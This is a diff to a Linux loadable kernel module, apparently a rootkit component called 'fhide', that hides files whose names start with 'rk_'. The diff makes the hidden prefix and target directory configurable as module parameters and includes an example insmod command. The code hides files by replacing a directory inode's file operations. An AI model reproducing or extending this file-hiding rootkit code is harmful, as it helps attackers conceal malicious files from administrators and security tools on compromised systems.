@@ -4,6 +4,18 @@
  * Functionality : Hiding files starting witk "rk_"
  */
 
+//Changes:
+//Added the ability to input the prefix & optionally, the path when inserting the module, as arguments.
+/*
+Example:
+//prefix = the prefix to hide.
+//kpath =  the dir to "operte" on / inside of.  Inside this directory the files with the chosen prefix will be hidden.
+
+sudo insmod fhide.ko prefix="_SomeVeryLongPrefix" path="/home/user/"
+
+*/
+
+
 #include <linux/init.h>
 #include <linux/kernel.h>
 #include <linux/module.h>
@@ -12,13 +24,21 @@
 
 #include <linux/proc_fs.h>
 
+
+
 static int __init fhide_init(void);
 static void __exit fhide_exit(void);
 
 module_init(fhide_init);
 module_exit(fhide_exit);
 
-static char *prefix = "rk_";
+//static char *prefix = "rk_";
+static char *prefix = "rk_"; //rk_Can be a default value,
+module_param(prefix, charp, S_IRUGO);
+
+static char *kpath = "/"; // as well as kpath.
+module_param(kpath, charp, S_IRUGO);
+
 struct file_operations proc_fops;
 const struct file_operations *backup_proc_fops;
 struct inode *proc_inode;
@@ -54,7 +74,8 @@ static int __init fhide_init(void)
     printk(KERN_INFO "FHide: LKM succefully loaded!\n");
     struct path p;
 
-    if(kern_path("/", 0, &p))
+//    if(kern_path("/", 0, &p))
+      if(kern_path(kpath, 0, &p))
         return 0;
 
     proc_inode = p.dentry->d_inode;
@@ -71,7 +92,8 @@ static void __exit fhide_exit(void)
 {
     struct path p;
     struct inode *proc_inode;
-    if(kern_path("/", 0, &p))
+//    if(kern_path("/", 0, &p))
+      if(kern_path(kpath, 0, &p))
         return;
     proc_inode = p.dentry->d_inode;
     proc_inode->i_fop = backup_proc_fops;
